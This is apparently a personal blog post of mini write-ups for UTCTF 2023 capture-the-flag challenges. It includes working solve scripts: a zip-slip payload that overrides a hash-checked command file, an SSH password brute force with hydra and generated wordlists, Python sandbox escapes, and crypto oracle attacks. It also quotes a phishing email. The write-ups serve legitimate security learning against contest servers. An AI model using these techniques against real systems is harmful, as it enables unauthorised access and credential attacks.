---
title: "UTCTF 2023 Megathread"
date: 2023-03-13T12:58:02-05:00
tags: ["crypto", "forensics", "misc", "networking", "reverse engineering", "web", "utctf", "2023"]
summary: Megathread for UTCTF 2023, contains mini writeups for most challenges
---

This past weekend I played in UTCTF 2023 by myself under [flocto solo run](https://utctf.live/teams/41).
Ended up in 11th place, not too shabby :sunglasses:

While there were some infra issues, I still had a lot of fun solving these challenges, so I would consider this one a success.
Looking forward to next year, unless hxp takes precedence.

Anyway, here's a megathread containing mini writeups for the challenges I solved. As always, I don't do pwn, so none of them are here.

---
# TOC
| Table of Contents |
| ----------- 
| [Misc](#misc) |
| - [Dry Run](#dry-run) |
| - [Half-time Survey](#half-time-survey) |
| - [Zipper](#zipper) |
| [Networking](#networking) |
| - [A Network Problem - Part 1](#a-network-problem---part-1) |
| - [A Network Problem - Part 2](#a-network-problem---part-2) |
| - [A Network Problem - Part 3](#a-network-problem---part-3) |
| [Web](#web) |
| - [Calculator](#calculator) |
| [Crypto](#crypto) |
| - [Affinity](#affinity) |
| - [Looks Wrong tom E](#looks-wrong-tom-e) |
| - [Provably Insecure](#provably-insecure) |
| [Reversing](#reversing) |
| - [Reading List](#reading-list) |
| - [Game](#game) |
| - [Looks Correct to Me](#looks-correct-to-me) |
| [Forensics](#forensics) |
| - ["Easy" Volatility](#easy-volatility) |
| - [What Time is It?](#what-time-is-it) |
| - [Redacted Text](#redacted-text) |
---

## Misc
Starting off with the simplest category.

### Dry Run
**Points: 20**
> Join our Discord server and look in the #announcements channel to find the flag. :-)

Just a sanity check chall, nothing to see here.
`utflag{welc0me_to_utctf!}`

[Back to TOC](#toc)

### Half-time Survey
**Points: 20**
> https://forms.gle/GnXCCpeCaaHPhU8o6

Again, nothing to see here, just a survey.
`utflag{hack_hack_hack}`

[Back to TOC](#toc)

### Zipper
**Points: 964**
> NOTE: echo 'Hello world' is the only "allowed" command. Do not bruteforce other commands.
>
> One of our spies has stolen documentation relating to a new class of missiles. Can you figure out how to hack them?
>
> "We have developed a new protocol to allow reprogramming missiles in flight. We send a base64 encoded string representing a specifically formatted zip file to control these missiles. The missiles themselves verify each command before executing them to ensure that a hacker cannot manipulate them."
>
> A sample message has also been stolen by our spy.
>
> By Aadhithya (@aadhi0319 on discord)
>
> `nc betta.utctf.live 12748`
>
> [commands.zip.b64](files/zipper/commands.zip.b64) [verify_hash.py](files/zipper/verify_hash.py)

The first *real* challenge. The original challenge didn't release with the Python file, so let's start with the b64 file.
Opening it up, we get:
```
UEsDBAoAAAAAADmPYVYAAAAAAAAAAAAAAAAJABwAY29tbWFuZHMvVVQJAAN95v9jfeb/Y3V4CwABBOgDAAAE6AMAAFBLAwQKAAAAAAAtj2FWWhLOtxMAAAATAAAAFAAcAGNvbW1hbmRzL2NvbW1hbmQudHh0VVQJAANm5v9jZub/Y3V4CwABBOgDAAAE6AMAAGVjaG8gJ0hlbGxvIFdvcmxkISdQSwMEFAAAAAgAMY9hVpwcB1ZUAAAAaQAAABIAHABjb21tYW5kcy9SRUFETUUubWRVVAkAA27m/2Nu5v9jdXgLAAEE6AMAAAToAwAANcrtDYAgDEXRVd4Axh0cpUKjxPIRWhS2l5j47yb3bArJ6QApXI6Rkl+t2+xkFJKCSqn5Zv9fXWAnQ4caRzxBBNzZNWMEwwSoLDQ+VFmbmGInd60vUEsBAh4DCgAAAAAAOY9hVgAAAAAAAAAAAAAAAAkAGAAAAAAAAAAQAO1BAAAAAGNvbW1hbmRzL1VUBQADfeb/Y3V4CwABBOgDAAAE6AMAAFBLAQIeAwoAAAAAAC2PYVZaEs63EwAAABMAAAAUABgAAAAAAAEAAACAgUMAAABjb21tYW5kcy9jb21tYW5kLnR4dFVUBQADZub/Y3V4CwABBOgDAAAE6AMAAFBLAQIeAxQAAAAIADGPYVacHAdWVAAAAGkAAAASABgAAAAAAAEAAACAgaQAAABjb21tYW5kcy9SRUFETUUubWRVVAUAA27m/2N1eAsAAQToAwAABOgDAABQSwUGAAAAAAMAAwABAQAARAEAAAAA
```
Very clearly this is base64, so let's decode it.
```py
import base64
data = open("commands.zip.b64", "r").read()
open("commands.zip", "wb").write(base64.b64decode(data))
```

```terminal
$ unzip commands.zip
Archive:  commands.zip
   creating: commands/
 extracting: commands/command.txt
  inflating: commands/README.md
```

Opening up `command.txt`, we get:
```
echo 'Hello World!'
```

And `README.md`:
```
As long as command.txt contains approved commands, the system will execute it and relay the results back.
```

After I got to this point in the original challenge, I was stuck for a while. I didn't really see anywhere to progress or check for "approved commands".
At some point, I moved on and came back when the `verify_hash.py` file was released.

Looking at the Python file, we see:
```py
import hashlib
import os
import sys
import zipfile

def get_file(name, archive):
    return [file for file in archive.infolist() if file.filename == name][0]

archive = zipfile.ZipFile(sys.argv[1])
file = get_file("commands/command.txt", archive)
print(file)
data = archive.read(file)
print(data, len(data))
md5 = hashlib.md5(data).hexdigest()
print(md5)

if md5 == "0e491b13e7ca6060189fd65938b0b5bc":
    archive.extractall()
    os.system("bash commands/command.txt")
    os.system("rm -r commands")
else:
    print("Invalid Command")
```

Very clearly there's a vulnerability if more than one file has the name `commands/command.txt` in the zip file. The `get_file` function will only return the first file, meaning when 
`extractall` is run, it can possibly overwrite the `command.txt` file with a malicious one.

So the solve is just a simple zip slip attack. We can create a zip file with a malicious `command.txt` file, and then zip it with the original `command.txt` file.
```py
import os
from base64 import b64decode, b64encode

folder = "commands"

with open("commands/command.txt", "w") as f:
    f.write("echo 'Hello World!'")

# zipslip
from zipfile import ZipFile
with ZipFile(f"{folder}.zip", "w") as zipObj:
    # add normal file
    zipObj.write("commands/command.txt", "commands/command.txt")
    # add zipslip file
    zipObj.write("inj.txt", "commands/../commands/command.txt") # the ../ isn't even necessary, just repeating commands/command.txt is enough


# read .zip file
with open(f"{folder}.zip", "rb") as f:
    data = f.read()

# encode .zip file
data = b64encode(data)

# nc betta.utctf.live 12748
from pwn import remote
r = remote("betta.utctf.live", 12748)

r.sendline(data)
r.interactive()
```

This gives us our flag: `utflag{https://youtu.be/bZe5J8SVCYQ}`

[Back to TOC](#toc)

## Networking
An interesting category you don't see in many CTFs. 

### A Network Problem - Part 1
**Points: 100**
> There are some interesting ports open on betta.utctf.live, particularly port 8080. By Robert Hill (@Rob H on discord)
> 
> `betta.utctf.live:8080`

This challenge is just connecting via netcat.
```terminal
$ nc betta.utctf.live 8080
Hi Wade! I am using socat to broadcat this message. Pretty nifty right? --jwalker utflag{meh-netcats-cooler}
```

[Back to TOC](#toc)

### A Network Problem - Part 2
**Points: 614**
> Update: smb port has been moved to 8445 from 445 on networking-misc-p2
>
> betta.utctf.live has other interesting ports. Lets look at 8445 this time. By Robert Hill (@Rob H on discord)
>
> `betta.utctf.live:8445`

This time its a Samba share. Trying to connect shows that we don't even need a specific username or password.
```terminal
$ smbclient -L \\betta.utctf.live -p 8445 -U %

        Sharename       Type      Comment
        ---------       ----      -------
        WorkShares      Disk      Sharing of work files
        BackUps         Disk      File Backups.
        IPC$            IPC       IPC Service (Samba Server)
$ smbclient \\\\betta.utctf.live\\WorkShares -p 8445 -U %
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar  8 13:45:05 2023
  ..                                  D        0  Wed Mar  8 13:45:05 2023
  shares                              D        0  Wed Mar  8 13:45:05 2023

                9974088 blocks of size 1024. 6100244 blocks available
smb: \> 
```
Anyway, after looking around for a while, we come across `\WorkShares\shares\IT\Itstuff\notetoIT`:
```terminal
smb: \shares\IT\Itstuff\> get notetoIT note.txt
...
$ cat note.txt
I don't understand the fasination with the magic phrase "abracadabra", but too many people are using them as passwords. Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood all basically have the same password. Can you please reach out to them and get them to change thier passwords or at least get them append a special character?

-- Arty F.

utflag{out-of-c0ntrol-access}
```

[Back to TOC](#toc)

### A Network Problem - Part 3
**Points: 935**
> We've gathered a lot of information at this point, let get access through ssh. (ignore port 22, use 8822)
>
> (Use of brute force is permitted for this problem, but please set the wait time in hydra so you don't overwhelm the server)
>
> By Rob H (@Rob H on discord)
>
> `betta.utctf.live:8822`

From the not-so-subtle hint that this is `ssh` bruteforce, let's go generate some possible usernames and passwords.
The note in the last challenges tells us that we have 4 people to bruteforce: Crystal Ball, Wade Coldwater, Jay Walker, and Holly Wood.
Their password is also likely to be `abracadabra` with some special character appended.
```py
names = ["Crystal Ball","Wade Coldwater", "Jay Walker", "Holly Wood"]

# formats
# FirstName.LastName
# LastName.FirstName
# FirstNameL
# FLastName
# LFirstName
# FirstName.L
# F.LastName
# in both upper and lower case

usernames = []
for name in names:
    first, last = name.split()
    finit = first[0]
    linit = last[0]
    usernames.append(first + last)
    usernames.append(last + first)
    usernames.append(first + '.' + last)
    usernames.append(last + '.' + first)
    usernames.append(first + linit)
    usernames.append(finit + last)
    usernames.append(first + '.' + linit)
    usernames.append(finit + '.' + last)

lower = [name.lower() for name in usernames]
upper = [name.upper() for name in usernames]
usernames.extend(lower)
usernames.extend(upper)
    
import string
special = string.punctuation
base = 'abracadabra'

passwords = []
for s in special:
    passwords.append(base + s)

with open("usernames.txt", "w") as f:
    for name in usernames:
        f.write(name + "\n")

with open("passwords.txt", "w") as f:
    for password in passwords:
        f.write(password + "\n")
```

Now we can use `hydra` to bruteforce the ssh server (and remembering to set a wait time to be nice to the server).
```terminal
$ hydra -L usernames.txt -P passwords.txt -t 4 betta.utctf.live:8822 ssh -W 0.1
```
After a while, we get a hit:
```terminal
[8822][ssh] host: betta.utctf.live   login: wcoldwater   password: abracadabra$
```
Now we can just connect via ssh and get our flag:
```terminal
$ ssh wcoldwater@betta.utctf.live -p 8822
wcoldwater@betta.utctf.live's password: abracadabra$
utctf{cust0m3d-lsts-rule!} well done!
```

[Back to TOC](#toc)

## Web
Only did a single web challenge, which was also actually just a Pyjail.

### Calculator
**Points: 856**
> Who says guessing games shouldn't let you do math?
>
> http://guppy.utctf.live:5957
>
> By Alex (@Alex_ on discord)

This challenge is actually just 4 mini pyjails. Each pyjail has the same format, which generally looked like this:
```py
from random import randbits
solution = randbits(32)
password = open("password.txt").read().strip()

inp = input("Input from the website: ")
guess = eval(inp) # later versions had eval(inp, {"__builtins__": {}}) and eval(inp, {})

if guess == solution:
    print("Correct!")
    print("The password is: " + password)
else:
    print("Incorrect!")
    print("Your guess was: ", guess, " and the solution was: ", solution)
```

The author unfortunately forgot that `solution` and `password` were both in the global scope so as long as we can access the `main` module, we can get them easily
```py
__import__("__main__").solution # for 0-2
```
The last challenge, challenge 3, removed `__builtins__`, so we couldn't use import. Fortunately the old `().__class__.__bases__[0].__subclasses__()` trick still works.
```py
().__class__.__base__.__subclasses__()[84]().load_module('__main__').solution # for 3
```

[Back to TOC](#toc)

## Crypto
Many blunders and mistakes...

### Affinity
**Points: 991**
> I just found out that the source code for AES is public. How can I trust that my secrets won't be decrypted if the decryption algorithm is public. Since I'm a genius, I decided to make some modifications and roll my own crypto. Now you'll never decrypt my secret!
>
> `3384f87f781c394b79e331510540a4125a371b057b058d8e793521cd43f2ae94`
>
> ^^all of that is one line even though it is split into two. I don't control the line breaks sorry :(. By Aadhithya (@aadhi0319 on Discord)
>
> `nc puffer.utctf.live 52584`
>
> [aes.py](files/affinity/aes.py) [encrypt_pub.py](files/affinity/encrypt_pub.py)

`aes.py` contains a simple AES implementation, with only one major difference.
```py
    # Rijndael S-box
    sbox = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]

    # Rijndael Inverted S-box
    rsbox = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]
```
The Sbox defined is actually equivalent to nothing, making the entire AES encryption process equivalent to an Affine function (see challenge name).

`encrypt_pub.py` is the server code, and all it does is encrypt via the broken AES.
```py
#!/usr/bin/env python3

from aes import AES
import sys

key = <REDACTED>

while True:
    print("plaintext hex string: ", end="")
    msg = bytes.fromhex(input())
    if len(msg) % 16 != 0:
        msg += b"\x00"*(16 - (len(msg) % 16))

    ciphertext = b""
    aes = AES()
    for i in range(0, len(msg), 16):
        msgblock = msg[i:i+16]
        cipherblock = bytes(aes.encrypt(msgblock, key, 16))
        ciphertext += cipherblock

    print(ciphertext.hex())
```

This type of challenge has definitely appeared before, so I won't go into detail. Here's a [helpful link](https://crypto.stackexchange.com/questions/67612/aes-oracle-with-bad-s-box)
if you want to look into it more.

I also have an exact copy of the challenge solved [here](https://github.com/flocto/writeups/blob/main/imaginaryCTF/round30/aes2/solve.py).

Actually I wasted about 2 hours on this challenge even though I literally already solved it before, because I thought the master key was the flag :joy:. 

Anyway here's the final solve:
```py
from aes import AES
from pwn import remote
# nc puffer.utctf.live 52584
r = remote('puffer.utctf.live', int(52584))

secret = '3384f87f781c394b79e331510540a4125a371b057b058d8e793521cd43f2ae94'
secret = bytes.fromhex(secret)
s_chunks = [secret[i:i+16] for i in range(0, len(secret), 16)]

r.sendlineafter(b'plaintext hex string:', b'0'*32 * len(s_chunks))
k = bytes.fromhex(r.recvline().strip().decode())
print(k.hex())
k_chunks = [k[i:i+16] for i in range(0, len(k), 16)]

print(s_chunks)
print(k_chunks)

aes = AES()
flag = b''
for k, s in zip(k_chunks, s_chunks):
    block = list([a ^ b for a, b in zip(k, s)])
    temp = [0] * 16
    for k in range(4):
        # iterate over the rows
        for l in range(4):
            temp[(k*4)+l] = block[(k+(l*4))]
    block = temp

    orig = aes.aes_invMain(block, [0] * 176, 10)
    temp = [0] * 16
    for i in range(4):
        # iterate over the rows
        for j in range(4):
            temp[(i+(j*4))] = orig[(i*4)+j]
    orig = temp
    flag += bytes(orig)

print(flag)
```
Flag is `utflag{5O_Th3_5B0x_d035_m4tt3R!}`

[Back to TOC](#toc)

### Looks Wrong tom E
**Points: 993**
> everything about this challenge looks wrong...
> 
> there are now 2 flags for this challenge btw so try submitting on the other one if this one doesn't work
>
> also this does mean that the source is lying to you a little bit ;)
> 
> By oops (@oops on discord)
> 
> `nc puffer.utctf.live 8484`

This one is cheese, just feed the server 0s and it will give you the flag.

```py
from pwn import remote
# nc puffer.utctf.live 8484
r = remote('puffer.utctf.live', 8484)

for round in range(1, 11):
    size = 10*min(round, 5) + 1
    
    r.sendlineafter(b'how many keys would you like? (1-10)', str(1).encode())
    r.sendlineafter(b'which key would you like to crack? (1-1)', str(1).encode())
    
    inj = [b'0'] * size 
    inj = b' '.join(inj)
    r.recvuntil(b'enter the secret key (%d space separated integers)\n' % size)
    r.sendline(inj)
    print(r.recvline())
r.interactive()
"""crypto"""
```
`utflag{mY_l34Rn1Ng_h4s_3rr0rs_2f11a84e}`

[Back to TOC](#toc)

### Provably Insecure
**Points: 993**
> I'm sure nobody remembers the fiasco from DiceCTF when I thought I had proven my cipher was secure. Can you fool this signature service?
>
> By Jeriah (@jyu on Discord)
> 
> `nc puffer.utctf.live 52548`
>
> [server.py](files/provably%20insecure/server.py)

```py
#!/usr/local/bin/python

from cryptography.hazmat.primitives.asymmetric import rsa
from secrets import randbits

if __name__ == '__main__':
    alice = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    print("Alice's pk: ", alice.public_key().public_numbers().n, alice.public_key().public_numbers().e)
    m = randbits(256)
    s = pow(m, alice.private_numbers().d, alice.public_key().public_numbers().n)
    print(m, s)
    print("Your key: ")
    n_prime = abs(int(input("n': ")))
    e_prime = abs(int(input("e': ")))
    d_prime = abs(int(input("d': ")))

    # Checks
    x = randbits(256)
    assert alice.public_key().public_numbers().n != n_prime or alice.public_key().public_numbers().e != e_prime
    assert n_prime > s
    assert pow(x, e_prime * d_prime, n_prime) == x
    assert e_prime > 1
    assert pow(s, e_prime, n_prime) == m

    with open('flag.txt', 'r') as f:
        print("Flag: " + f.read().strip())
```

All we need to do is generate `n'` such that we can solve a discrete log easily on `s` and `m`. I made a mistake and assumed large composite numbers wouldn't work because
the inverse didn't exist, but all you had to do was try multiple times. 

My final solution ended up being generating a smooth prime and doing dlog that way.
```py
import random
def gen_smooth_prime(s):
    small_primes = []
    t = 2
    while len(small_primes) < 1000:
        small_primes.append(t)
        t = next_prime(t)
    
    while True:
        chosen = random.sample(small_primes, 100)
        p = product(chosen)
        while p < s:
            np = random.choice(small_primes)
            if np not in chosen:
                chosen.append(np)
                p *= np
        if is_prime(p + 1):
            return p + 1
        
from tqdm import tqdm
def pohlig_hellman(prime, base, target):
    factors = factor(prime - 1)
    print(factors)

    Xs = []
    Ps = []
    for f, e in tqdm(factors):
        # print(f, e)
        sub_prime = (prime - 1) // f
        sub_base = pow(base, sub_prime, prime)
        sub_target = pow(target, sub_prime, prime)
        sub_x = 0
        for sub_x in range(1, f):
            if pow(sub_base, sub_x, prime) == sub_target:
                break
        # assert pow(sub_base, sub_x, prime) == sub_target
        Xs.append(sub_x)
        Ps.append(f)
        # print(f, sub_x, len(Xs),  len(factors))

    res = crt(Xs, Ps)
    return res

from pwn import remote
from Crypto.Util.number import *
# nc puffer.utctf.live 52548
r = remote('puffer.utctf.live', int(52548))
line = r.recvline().decode().strip().split(' ')
N = int(line[3])
e = int(line[4])
line = r.recvline().decode().strip().split(' ')
m = int(line[0])
s = int(line[1])

print(f"N={N}, e={e}, m={m}, s={s}")

np = gen_smooth_prime(N)
print(np)


print(f"np={np}\ns={s}\nm={m}")
ep = pohlig_hellman(np, s, m)
print(f"ep={ep}")

assert pow(s, ep, np) == m

dp = inverse_mod(ep, euler_phi(np))
print(f"dp={dp}")

r.sendline(str(np))
r.sendline(str(ep))
r.sendline(str(dp))

r.interactive() 
```
`utflag{hey_wait_signature_forgery_is_illegal}`

[Back to TOC](#toc)

## Reversing

### Reading List
**Points: 100**
> I created this binary to keep track of some strings that I want to read. I thought I put a CTF flag in it so I'll remember to make a problem for UTCTF, but I can't seem to find it...
> 
> By Caleb (@eden.caleb.a#6541 on Discord)
>
> [readingList](files/rev/readingList)

Very simple strings challenge
```terminal
$ strings readingList | grep "utflag"
utflag{string_theory_is_a_cosmological_theory_based_on_the_existence_of_cosmic_strings}
```

[Back to TOC](#toc)

### Game
**Points: 930**
> Nostalgic overload, at least for me. Credit due to Carolina.
> 
> By Jeriah (@jyu on Discord)
>
> [game](files/rev/game)

The given game is actually a `.swf` file, so let's throw it into a decompiler like JPEXS.

Inside the file, we can search for the flag via the flag format and find it pretty easily.

![searching for flag](/img/writeups/2023/UTCTF/jpexs_search.png)

![flag found](/img/writeups/2023/UTCTF/jpexs_found.png)

`utflag{they_kn0w}`

[Back to TOC](#toc)

### Looks Correct to Me
**Points: 984**
> the flag checker looks right to me
> 
> oh I guess it doesn't terminate if your flag is right
> 
> By oops (@oops on discord)
>
> [check](files/rev/check)

Not going to go into the decompilation and analysis, but essentially the program just checks pairs of random indices in the flag to see if they match 
some values inside a giant matrix with some conditions.

If the pair of indices ever fails to satisfy the conditions, the program will exit. Otherwise, it will continue forever, proving the description.

Here's the solve with the extracted memory: [data](files/rev/data)

```py
data = open("data", "rb").read()

nums = []
for i in range(0, len(data), 4):
    nums.append(int.from_bytes(data[i:i+4], "little"))

flag = 'u'
known = 117

LENGTH = 49
for i in range(1, LENGTH):
    n = nums[i]
    for x in range(32, 128): # searching possible ascii values
        if (x ^ n ^ known) % x == 0 and (x ^ n ^ known) % known == 0:
            flag += chr(x)

print(flag)
```
`utflag{L0c4l1z3d_Ch1ck3n_M0d1f1c4t10N_g8h91b3h89}`

[Back to TOC](#toc)

## Forensics
Wooo redacted text woooo

### "Easy" Volatility
**Points: 834**
> I've included the flag in as shell command. Can you retrieve it?
> 
> I recommend using the volatility3 software for this challenge.
> 
> Here is the memory dump: (debian11.core.zst)[https://utexas.box.com/s/fehluzyox4bbgfjlz061r2k7k2sek3cw]
> This problem also comes with a free profile! (debian11_5.10.0-21.json.zst)[https://utexas.box.com/s/g64kezqvkqhm6nw79oovcekn9z1w66q0]
> Both of these files are compressed using zstd.
> 
> This challenge's flag looks like a UUID.
> 
> > Note: the volatility challenges do not have a flag format to discourage grepping. They all should be possible without guessing. If you have trouble, remember that you can ask for help.
> 
> By Daniel Parks (@danielp on discord)

This really is an easy challenge, all we need to do is expand the memory dump and profile, import the profile into volatility3, and finally run the `linux.bash.Bash` plugin

```terminal
$ python3 volatility3/vol.py -f debian11.core linux.bash.Bash
Volatility 3 Framework 2.4.2
Progress:  100.00               Stacking attempts finished
PID     Process CommandTime     Command

467     bash    2023-03-05 18:21:23.000000      # 08ffea76-b232-4768-a815-3cc1c467e813
```
`08ffea76-b232-4768-a815-3cc1c467e813` (no flag format for these)

[Back to TOC](#toc)

### What Time is It?
**Points: 905**
> Super Secure Company's database was recently breached. One of the employees self reported a potential phishing event that could be related. Unfortunately, our Linux email server does not report receiving any emails on March 2, 2023. Can you identify when this email was actually sent? The flag format is `utflag{MM/DD/YYYY-HH:MM}` in UTC time.
> 
> By Aadhithya (@aadhi0319 on Discord)
>
> [phishing.eml](files/wtit/phishing.eml)

Looking at the email, nothing seems too out of place:
```
MIME-Version: 1.0
Date: Thu, 2 Mar 2023 03:12:42 +0000
Message-ID: <CAODBzaAPrwTP=oDe6fkOv1a7LApXzv1m+YrYG9RHZM7tbBJRbw@mail.gmail.com>
Subject: Critical Security Incident - Action Required ASAP!
From:  Security Division <admin-notifications@supersecurecompany.com>
To: Jim Browning <jim.browning@supersecurecompany.com>
Content-Type: multipart/alternative; boundary="00000000000093882205f60cdcdb"

--00000000000093882205f60cdcdb
Content-Type: text/plain; charset="UTF-8"

Jim,

We have reason to believe that your Google account may have been
compromised. Please login as soon as possible at the following link in
order to secure your account. Thank you for your cooperation and swift
action to address this issue. Please feel free to reply to this email if
you have any questions. Do not email IT about this email as they are not in
the loop on account authorization issues.

https://supersecurecompany.gooogle.com/login/

Sincerely,
Security Division
Super Secure Company

--00000000000093882205f60cdcdb
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div di=
r=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div>Jim,</div><div><br></div><=
div>We have reason to believe that your=20
Google account may have been compromised. Please login as soon as=20
possible at the following link in order to secure your account. Thank=20
you for your cooperation and swift action to address this issue. Please=20
feel free to reply to this email if you have any questions. Do not email
 IT about this email as they are not in the loop on account=20
authorization issues.</div><div><br></div><div><a href=3D"https://supersecu=
recompany.gooogle.com/login/">https://supersecurecompany.gooogle.com/login/=
</a><br></div><div><br></div><div>Sincerely,</div><div>Security Division</d=
iv><div>Super Secure Company<br></div></div></div></div></div></div></div><=
/div>

--00000000000093882205f60cdcdb--
```

However, something special about Gmail boundaries is that they actually contain timestamps, so all we need to do is extract them.

If you want more information, read [here](https://www.metaspike.com/gmail-mime-boundary-delimiter-timestamps/)

```py
from datetime import datetime

boundary = "00000000000093882205f60cdcdb"

ts = int(boundary[18:-2] + boundary[12:-10], 16) / 1000000
# utflag{MM/DD/YYYY-HH:MM}
print(datetime.utcfromtimestamp(ts).strftime('%m/%d/%Y-%H:%M'))
```
`utflag{03/04/2023-06:06}`

[Back to TOC](#toc)

### Redacted Text
**Points: 1000**
> Note: there are two accepted flags for Redacted Text, of which you only need to find one.
> 
> Well, I recently found out that people actually put in the effort to reverse engineer blured text... Want to try it?
> 
> This now has three versions, in order of decreasing difficulty:
> 
> - redacted.png (the original)
> - redacted-no-subpixel-aa.png (disabled subpixel anti-aliasing, changed font size)
> - redacted-aligned.png (integer pixel aligned text, alternate flag)
> 
> By Alex (@Alex_ on discord)
>
> (I only solved for one so I'm only including the download for this image)
> [redacted-aligned.png](files/redacted/redacted-aligned.png)

I'm preparing to write a full writeup for this challenge [here](redacted-text.md)
so this will stay empty for now. Click that link to read the full thing when it comes out.

[Back to TOC](#toc)

## END